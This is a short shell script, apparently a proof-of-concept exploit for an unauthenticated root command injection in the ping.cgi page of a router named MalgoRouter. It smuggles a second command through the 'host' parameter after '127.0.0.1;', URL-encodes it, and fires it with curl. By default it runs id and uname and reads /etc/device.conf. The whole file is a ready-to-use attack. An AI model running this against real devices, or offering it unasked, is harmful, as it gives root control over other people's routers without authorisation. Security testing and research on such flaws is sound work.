#!/bin/sh
# M1 - ping.cgi unauthenticated OS command injection (root).
# The injected command's output is redirected into /tmp/ping.txt and returned.
: "${TARGET:?set TARGET to the MalgoRouter IP}"
CMD="${1:-id; uname -a; cat /etc/device.conf}"
# URL-encode spaces/semicolons minimally
enc=$(printf '%s' "127.0.0.1;${CMD}" | sed 's/ /%20/g; s/;/%3b/g')
echo "[*] GET http://$TARGET/cgi-bin/ping.cgi?host=$enc"
curl -s --max-time 15 "http://$TARGET/cgi-bin/ping.cgi?host=$enc"
